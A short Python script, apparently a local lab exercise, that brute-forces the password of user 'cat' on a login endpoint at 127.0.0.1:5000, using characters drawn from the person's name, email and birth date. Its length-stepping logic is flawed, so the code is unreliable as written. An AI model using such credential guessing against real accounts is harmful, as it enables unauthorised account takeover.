import requests

def get_chars(str_chars):
    result = ''
    for c in str_chars:
        if c not in result:
            result += c

    return result

email = 'email'
first_name = 'first_name'
last_name = 'last_name'
date_born = '03/02/2020'
alphabet = get_chars(email+first_name+last_name+date_born)
base = len(alphabet)

i = 0
length = 0

while True:
    result = ''
    temp = i
    while temp > 0:
        rest = temp % base
        result = alphabet[rest] + result
        temp = temp // base

    while len(result) < length:
        result = '0' + result

    data = {'login': 'cat', 'password': result}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)

    if response.status_code == 200:
        print('Successs', result)
        break

    if result == 'z'*length:
        length += 1
        i = 0
    else:
        i += 1


